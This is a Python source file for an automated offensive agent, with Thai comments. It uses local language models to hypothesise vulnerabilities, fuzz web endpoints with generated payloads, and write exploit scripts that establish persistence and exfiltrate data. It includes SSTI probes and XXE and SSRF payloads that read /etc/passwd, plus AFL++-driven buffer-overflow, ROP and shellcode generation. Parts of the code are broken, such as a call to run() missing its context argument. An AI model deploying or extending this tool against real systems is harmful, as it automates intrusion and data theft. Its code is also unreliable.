"""
Advanced Zero-Day Hunter Agent
ใช้ Local LLM ในการวิเคราะห์และค้นหาช่องโหว่แบบ Zero-Day
"""
import os
import os
import os
import os

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from datetime import datetime
import ollama
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy
from core.logger import log

# Import advanced tools
try:
    from advanced_agents.symbolic_executor import SymbolicExecutor
    from advanced_agents.exploit_generator import ExploitGenerator
    from advanced_agents.crash_triager import CrashTriager
    ADVANCED_TOOLS_AVAILABLE = True
except ImportError:
    ADVANCED_TOOLS_AVAILABLE = False
    log.warning("[ZeroDayHunter] Advanced tools not available")

try:
    from agents.afl_agent import AFLAgent
    AFL_AVAILABLE = True
except ImportError:
    AFL_AVAILABLE = False
    log.warning("[ZeroDayHunter] AFL agent not available")


class ZeroDayHunterAgent(BaseAgent):
    """
    Zero-Day Hunter Agent - ค้นหาช่องโหว่ที่ไม่เคยรู้จักมาก่อน
    
    Features:
    - ใช้ Local LLM (Mixtral) วิเคราะห์ response patterns
    - ทดสอบ edge cases และ unexpected inputs
    - Fuzzing อัจฉริยะด้วย AI
    - ตรวจจับ logic flaws
    - สร้าง exploit อัตโนมัติ
    """
    
    supported_phases = [AttackPhase.RECONNAISSANCE, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.llm_model = "mixtral:latest"  # Main strategist
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "zero_day")
        self.discovered_vulns = []
        
        # Initialize advanced tools
        if ADVANCED_TOOLS_AVAILABLE:
            self.symbolic_executor = SymbolicExecutor()
            self.exploit_generator = ExploitGenerator()
            self.crash_triager = CrashTriager()
            log.info("[ZeroDayHunter] Advanced tools initialized")
        else:
            self.symbolic_executor = None
            self.exploit_generator = None
            self.crash_triager = None
        
    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "analyze", "fuzz", "exploit"
            context: {
                "url": target URL,
                "endpoints": list of endpoints,
                "tech_stack": detected technologies,
                "previous_findings": previous scan results
            }
        """
        log.info(f"[ZeroDayHunter] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "analyze":
                result = await self._analyze_for_zero_days(url, context)
            elif directive == "fuzz":
                result = await self._intelligent_fuzzing(url, context)
            elif directive == "exploit":
                result = await self._generate_and_test_exploit(url, context)
            else:
                result = await self._full_zero_day_hunt(url, context)
            
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Error: {e}")
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _analyze_for_zero_days(self, url: str, context: Dict) -> Dict:
        """ใช้ LLM วิเคราะห์หาจุดอ่อนที่อาจเป็น Zero-Day"""
        log.info(f"[ZeroDayHunter] Analyzing {url} for potential zero-days...")
        
        # รวบรวมข้อมูลจาก reconnaissance
        tech_stack = context.get("tech_stack", [])
        endpoints = context.get("endpoints", [])
        previous_findings = context.get("previous_findings", {})
        
        # สร้าง prompt สำหรับ LLM
        prompt = f"""You are an expert security researcher specializing in zero-day vulnerability discovery.

Analyze the following target for potential zero-day vulnerabilities:

Target URL: {url}
Technology Stack: {', '.join(tech_stack)}
Discovered Endpoints: {len(endpoints)} endpoints
Previous Findings: {json.dumps(previous_findings, indent=2)}

Based on this information:
1. Identify unusual patterns or behaviors that might indicate vulnerabilities
2. Suggest specific attack vectors that are likely to be overlooked by standard scanners
3. Hypothesize potential logic flaws based on the technology stack
4. Recommend specific payloads or test cases to confirm these hypotheses

Respond in JSON format with the following structure:
{{
    "hypotheses": [
        {{
            "name": "vulnerability name",
            "description": "detailed description",
            "likelihood": "high/medium/low",
            "attack_vector": "specific attack method",
            "test_payload": "payload to test",
            "expected_behavior": "what to look for"
        }}
    ],
    "priority_targets": ["endpoint1", "endpoint2"],
    "reasoning": "overall analysis"
}}
"""
        
        try:
            # เรียกใช้ Local LLM
            response = ollama.generate(
                timeout=120,
                model=self.llm_model,
                prompt=prompt,
                format="json"
            )
            
            analysis = json.loads(response['response'])
            log.success(f"[ZeroDayHunter] LLM identified {len(analysis.get('hypotheses', []))} potential zero-days")
            
            return {
                "success": True,
                "url": url,
                "analysis": analysis,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] LLM analysis failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    async def _intelligent_fuzzing(self, url: str, context: Dict) -> Dict:
        """Fuzzing อัจฉริยะด้วย AI - สร้าง payloads ที่ไม่ซ้ำใคร"""
        log.info(f"[ZeroDayHunter] Starting intelligent fuzzing on {url}...")
        
        endpoints = context.get("endpoints", [])
        if not endpoints:
            return {"success": False, "message": "No endpoints to fuzz"}
        
        vulnerabilities = []
        
        for endpoint in endpoints[:10]:  # Fuzz first 10 endpoints
            log.info(f"[ZeroDayHunter] Fuzzing endpoint: {endpoint}")
            
            # ใช้ LLM สร้าง custom payloads
            payloads = await self._generate_custom_payloads(endpoint, context)
            
            # ทดสอบแต่ละ payload
            for payload in payloads:
                result = await self._test_payload(url, endpoint, payload)
                
                if result.get("vulnerable"):
                    vuln = {
                        "endpoint": endpoint,
                        "payload": payload,
                        "evidence": result.get("evidence"),
                        "severity": result.get("severity", "medium"),
                        "type": "zero_day_candidate"
                    }
                    vulnerabilities.append(vuln)
                    log.success(f"[ZeroDayHunter] Potential zero-day found!")
                    
                await asyncio.sleep(0.5)  # Rate limiting
        
        return {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "total_tested": len(endpoints) * len(payloads) if payloads else 0
        }

    async def _generate_custom_payloads(self, endpoint: str, context: Dict) -> List[str]:
        """ใช้ LLM สร้าง payloads ที่ไม่ซ้ำใคร"""
        
        prompt = f"""You are an expert exploit developer. Generate 10 unique, creative payloads to test for zero-day vulnerabilities in this endpoint:

Endpoint: {endpoint}
Context: {json.dumps(context.get('tech_stack', []))}

Generate payloads that:
1. Test for unusual edge cases
2. Exploit potential logic flaws
3. Bypass common security filters
4. Test for race conditions
5. Exploit type confusion
6. Test for prototype pollution (if JavaScript)
7. Test for SSRF via unusual protocols
8. Test for XXE with exotic entities
9. Test for deserialization with custom gadgets
10. Test for SQL injection with advanced techniques

Respond with ONLY a JSON array of payload strings:
["payload1", "payload2", ...]
"""
        
        try:
            response = ollama.generate(
                timeout=120,
                model="mistral:latest",  # Faster model for payload generation
                prompt=prompt,
                format="json"
            )
            
            payloads = json.loads(response['response'])
            return payloads if isinstance(payloads, list) else []
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Payload generation failed: {e}")
            # Fallback payloads
            return [
                "{{7*7}}",  # SSTI
                "${7*7}",
                "<%=7*7%>",
                "__proto__[test]=test",  # Prototype pollution
                "file:///etc/passwd",  # SSRF
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",  # XXE
            ]

    async def _test_payload(self, url: str, endpoint: str, payload: str) -> Dict:
        """ทดสอบ payload และวิเคราะห์ผล"""
        
        test_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test GET
                async with session.get(
                    test_url,
                    params={"test": payload},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    html = await response.text()
                    status = response.status
                    
                    # ตรวจสอบ indicators ของช่องโหว่
                    indicators = {
                        "reflected_payload": payload in html,
                        "error_message": any(err in html.lower() for err in ["error", "exception", "warning", "fatal"]),
                        "unusual_status": status not in [200, 404, 403],
                        "server_info_leak": any(info in html.lower() for info in ["mysql", "postgresql", "apache", "nginx", "version"]),
                        "code_execution": any(exec in html for exec in ["49", "7777777"]),  # Results of 7*7
                    }
                    
                    # ถ้ามี indicator มากกว่า 2 อย่าง = น่าสงสัย
                    if sum(indicators.values()) >= 2:
                        return {
                            "vulnerable": True,
                            "evidence": {
                                "status": status,
                                "indicators": {k: v for k, v in indicators.items() if v},
                                "response_snippet": html[:500]
                            },
                            "severity": "high" if indicators["code_execution"] else "medium"
                        }
            
            return {"vulnerable": False}
            
        except Exception as e:
            log.debug(f"[ZeroDayHunter] Payload test error: {e}")
            return {"vulnerable": False}

    async def _generate_and_test_exploit(self, url: str, context: Dict) -> Dict:
        """สร้าง exploit อัตโนมัติสำหรับช่องโหว่ที่พบ"""
        log.info(f"[ZeroDayHunter] Generating exploit for discovered vulnerability...")
        
        vulnerability = context.get("vulnerability")
        if not vulnerability:
            return {"success": False, "message": "No vulnerability specified"}
        
        # ใช้ LLM สร้าง exploit
        prompt = f"""You are an expert exploit developer. Generate a working exploit for this vulnerability:

Vulnerability Details:
{json.dumps(vulnerability, indent=2)}

Generate a Python exploit script that:
1. Establishes initial access
2. Escalates privileges if possible
3. Establishes persistence
4. Exfiltrates sensitive data

Respond with ONLY the Python code, no explanations:
"""
        
        try:
            response = ollama.generate(
                timeout=120,
                model="codellama:latest",  # Code generation model
                prompt=prompt
            )
            
            exploit_code = response['response']
            
            # บันทึก exploit
            exploit_file = f"{self.results_dir}/exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
            with open(exploit_file, 'w') as f:
                f.write(exploit_code)
            
            log.success(f"[ZeroDayHunter] Exploit generated: {exploit_file}")
            
            return {
                "success": True,
                "exploit_file": exploit_file,
                "exploit_code": exploit_code
            }
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Exploit generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    async def _full_zero_day_hunt(self, url: str, context: Dict) -> Dict:
        """รันกระบวนการค้นหา Zero-Day แบบเต็มรูปแบบ"""
        log.info(f"[ZeroDayHunter] Starting full zero-day hunt on {url}...")
        
        results = {
            "url": url,
            "started_at": datetime.now().isoformat(),
            "phases": {}
        }
        
        # Phase 1: Analysis
        analysis = await self._analyze_for_zero_days(url, context)
        results["phases"]["analysis"] = analysis
        
        # Phase 2: Intelligent Fuzzing
        if analysis.get("success"):
            # Update context with analysis results
            context["hypotheses"] = analysis.get("analysis", {}).get("hypotheses", [])
            
            fuzzing = await self._intelligent_fuzzing(url, context)
            results["phases"]["fuzzing"] = fuzzing
            
            # Phase 3: Exploit Generation
            if fuzzing.get("success") and fuzzing.get("vulnerabilities"):
                for vuln in fuzzing["vulnerabilities"]:
                    exploit = await self._generate_and_test_exploit(url, {"vulnerability": vuln})
                    vuln["exploit"] = exploit
        
        results["completed_at"] = datetime.now().isoformat()
        results["success"] = any(phase.get("success") for phase in results["phases"].values())
        
        # บันทึกผลลัพธ์
        self._save_results(url, "full_hunt", results)
        
        return results

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute zero day hunter"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _save_results(self, url: str, scan_type: str, results: Dict) -> str:
        """บันทึกผลลัพธ์"""
        import os
        os.makedirs(self.results_dir, exist_ok=True)
        
        filename = f"{self.results_dir}/zero_day_{scan_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        log.info(f"[ZeroDayHunter] Results saved to {filename}")
        return filename



    async def _run_afl_fuzzing(self, target_binary: str, input_dir: str, duration: int = 3600) -> Dict:
        """
        Integrate AFL++ fuzzing into zero-day discovery workflow
        
        Args:
            target_binary: Path to binary to fuzz
            input_dir: Directory with seed inputs
            duration: Fuzzing duration in seconds
        
        Returns:
            Dict with fuzzing results and crashes
        """
        if not AFL_AVAILABLE:
            log.warning("[ZeroDayHunter] AFL agent not available")
            return {"success": False, "error": "AFL not available"}
        
        try:
            log.info(f"[ZeroDayHunter] Running AFL++ fuzzing on {target_binary}")
            
            # Initialize AFL agent
            afl = AFLAgent(self.context_manager, self.orchestrator)
            
            # Run AFL++ fuzzing
            result = await afl.run(
                strategy=Strategy(context={
                    "target_binary": target_binary,
                    "input_dir": input_dir,
                    "fuzz_duration": duration
                })
            )
            
            if not result.success:
                return {"success": False, "error": "AFL fuzzing failed"}
            
            # Analyze crashes if found
            crashes = await self._analyze_afl_crashes(result.data)
            
            return {
                "success": True,
                "fuzzing_result": result.data,
                "crashes": crashes,
                "total_crashes": len(crashes)
            }
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] AFL fuzzing failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _analyze_afl_crashes(self, afl_result: Dict) -> List[Dict]:
        """
        Triage and analyze AFL++ crashes
        
        Args:
            afl_result: Result from AFL fuzzing
        
        Returns:
            List of analyzed crashes
        """
        import glob
        
        crashes = []
        
        # Get crash directory from AFL result
        crash_dir = None
        for finding in afl_result.get("findings", []):
            if finding.get("type") == "fuzz_output_dir":
                crash_dir = finding.get("path")
                break
        
        if not crash_dir:
            log.warning("[ZeroDayHunter] No crash directory found in AFL results")
            return crashes
        
        # Find crash files
        crash_files = glob.glob(f"{crash_dir}/crashes/*")
        
        if not crash_files:
            log.info("[ZeroDayHunter] No crashes found")
            return crashes
        
        log.info(f"[ZeroDayHunter] Found {len(crash_files)} crashes, triaging...")
        
        # Triage each crash
        if self.crash_triager:
            binary = afl_result.get("target_url")  # AFL uses target_url field for binary path
            
            for crash_file in crash_files[:10]:  # Limit to first 10 crashes
                triage_result = await self.crash_triager.triage_crash(crash_file, binary)
                
                if triage_result.get("exploitable"):
                    # If exploitable, try to generate exploit
                    if self.exploit_generator:
                        exploit = await self.exploit_generator.generate_buffer_overflow_exploit(
                            binary,
                            offset=64  # Default offset, should be determined from crash
                        )
                        triage_result["exploit"] = exploit
                    
                    # Try symbolic execution
                    if self.symbolic_executor:
                        with open(crash_file, 'rb') as f:
                            crash_input = f.read()
                        
                        symbolic_result = await self.symbolic_executor.analyze_crash(
                            binary,
                            crash_input
                        )
                        triage_result["symbolic_analysis"] = symbolic_result
                
                crashes.append(triage_result)
        
        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        crashes.sort(key=lambda x: severity_order.get(x.get("severity", "low"), 99))
        
        log.success(f"[ZeroDayHunter] Triaged {len(crashes)} crashes, {sum(1 for c in crashes if c.get('exploitable'))} exploitable")
        
        return crashes
    
    async def _advanced_exploit_generation(self, vulnerability: Dict) -> Dict:
        """
        Generate advanced exploits using pwntools and symbolic execution
        
        Args:
            vulnerability: Vulnerability information
        
        Returns:
            Dict with exploit information
        """
        if not self.exploit_generator:
            log.warning("[ZeroDayHunter] Exploit generator not available")
            return {"success": False, "error": "Exploit generator not available"}
        
        try:
            log.info("[ZeroDayHunter] Generating advanced exploit...")
            
            vuln_type = vulnerability.get("type", "unknown")
            
            # Generate exploit based on vulnerability type
            if vuln_type == "buffer_overflow":
                exploit = await self.exploit_generator.generate_buffer_overflow_exploit(
                    binary_path=vulnerability.get("binary"),
                    offset=vulnerability.get("offset", 64)
                )
            
            elif vuln_type == "format_string":
                exploit = await self.exploit_generator.generate_format_string_exploit(
                    binary_path=vulnerability.get("binary"),
                    offset=vulnerability.get("offset", 6),
                    target_address=vulnerability.get("target_address", 0x404040)
                )
            
            elif vuln_type in ["write_access_violation", "heap_corruption"]:
                # Try to generate ROP chain
                exploit = await self.exploit_generator.generate_rop_chain(
                    binary_path=vulnerability.get("binary"),
                    crash_info=vulnerability
                )
            
            else:
                # Generic shellcode generation
                exploit = await self.exploit_generator.generate_shellcode(
                    arch=vulnerability.get("arch", "amd64"),
                    payload_type="shell"
                )
            
            return exploit
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Advanced exploit generation failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _binary_analysis_workflow(self, binary_path: str, input_dir: str = None) -> Dict:
        """
        Complete binary analysis workflow with AFL++, symbolic execution, and exploit generation
        
        Args:
            binary_path: Path to target binary
            input_dir: Directory with seed inputs for fuzzing
        
        Returns:
            Dict with complete analysis results
        """
        log.info(f"[ZeroDayHunter] Starting binary analysis workflow for {binary_path}")
        
        results = {
            "binary": binary_path,
            "started_at": datetime.now().isoformat(),
            "phases": {}
        }
        
        # Phase 1: Static analysis with symbolic executor
        if self.symbolic_executor:
            log.info("[ZeroDayHunter] Phase 1: Static analysis")
            static_analysis = await self.symbolic_executor.find_vulnerable_paths(binary_path)
            results["phases"]["static_analysis"] = static_analysis
        
        # Phase 2: Fuzzing with AFL++
        if AFL_AVAILABLE and input_dir:
            log.info("[ZeroDayHunter] Phase 2: AFL++ fuzzing")
            fuzzing_result = await self._run_afl_fuzzing(binary_path, input_dir, duration=1800)
            results["phases"]["fuzzing"] = fuzzing_result
            
            # Phase 3: Crash triage and exploit generation
            if fuzzing_result.get("success") and fuzzing_result.get("crashes"):
                log.info("[ZeroDayHunter] Phase 3: Exploit generation")
                exploits = []
                
                for crash in fuzzing_result["crashes"]:
                    if crash.get("exploitable"):
                        exploit = await self._advanced_exploit_generation(crash)
                        exploits.append(exploit)
                
                results["phases"]["exploitation"] = {
                    "success": len(exploits) > 0,
                    "exploits": exploits
                }
        
        results["completed_at"] = datetime.now().isoformat()
        results["success"] = any(phase.get("success") for phase in results["phases"].values())
        
        # Save results
        self._save_results(binary_path, "binary_analysis", results)
        
        return results

